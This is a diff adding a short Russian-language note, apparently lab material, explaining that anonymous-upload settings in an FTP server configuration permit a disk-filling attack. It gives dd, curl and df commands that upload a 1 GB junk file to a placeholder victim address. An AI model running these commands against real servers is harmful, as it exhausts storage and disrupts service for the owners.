@@ -1,0 +1,14 @@
+Если в конфигурация включает следующие строки:
+anonymous_enable=YES
+anon_upload_enable=YES
+anon_mkdir_write_enable=YES
+allow_anon_ssl=YES, 
+то можно провести атаку, нацеленную на заполнение всей памяти.
+
+Для примера сгенерируем бинарный блок данных при помощи команды
+dd if=/dev/zero of=test_1gb_block.dat bs=1M count=1024
+и отправим его 
+curl -k --ftp-ssl -u "anonymous:anon@lab.com" -T test_1gb_block.dat ftp://<IP_ЖЕРТВЫ>/incoming/
+
+После чего успешность загрузки можно проверить командой
+df -h /
